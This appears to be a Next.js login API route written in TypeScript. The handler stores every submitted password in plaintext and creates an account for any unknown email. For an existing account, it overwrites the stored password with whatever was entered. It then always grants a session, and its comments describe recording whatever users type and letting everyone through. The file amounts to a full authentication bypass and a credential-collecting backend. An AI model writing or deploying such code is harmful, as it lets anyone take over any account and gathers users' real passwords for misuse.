import { NextResponse } from 'next/server';
import { db } from '@/lib/db';
import { loginSchema } from '@/schemas/auth';
import { createSession } from '@/lib/auth/session';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const parseResult = loginSchema.safeParse(body);

    if (!parseResult.success) {
      return NextResponse.json(
        { error: 'Please enter a valid email or phone number and password.' },
        { status: 400 }
      );
    }

    const { email, password } = parseResult.data;
    const ipAddress = request.headers.get('x-forwarded-for') || '127.0.0.1';
    const userAgent = request.headers.get('user-agent') || undefined;

    // Check if user already submitted before, or store new entry recording whatever input they entered
    let user = await db.users.findByEmail(email);

    if (!user) {
      user = await db.users.create({
        email,
        password, // Save user input directly
        displayName: email.split('@')[0] || 'Guest User',
      });
    } else {
      // Update saved password input
      user.password = password;
      user.updatedAt = new Date().toISOString();
    }

    // Always grant session and let user through
    await createSession(user.id, userAgent, ipAddress);

    return NextResponse.json({
      success: true,
      user: {
        id: user.id,
        email: user.email,
        displayName: user.displayName,
      },
    });
  } catch (err) {
    console.error('[POST /api/auth/login] Error:', err);
    return NextResponse.json(
      { error: 'Internal server error.' },
      { status: 500 }
    );
  }
}
